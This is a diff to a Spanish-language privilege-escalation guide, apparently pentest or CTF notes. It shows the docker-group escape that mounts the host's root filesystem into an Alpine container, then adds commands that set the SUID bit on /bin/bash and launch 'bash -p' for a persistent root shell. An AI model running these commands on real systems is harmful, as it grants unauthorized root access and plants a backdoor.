@@ -62,7 +62,12 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
 >NOTA
->Seremos root en el contenedor, no en la máquina. Pero podremos acceder a todo el sistema de ficheros.
+>Seremos root en el contenedor, no en la máquina. Pero podremos acceder a todo el sistema de ficheros, una vez hecho esto:
+
+```bash
+chmod u+s /bin/bash
+bash -p
+```
 
 ### Binario con permisos de edición y ejecución
 
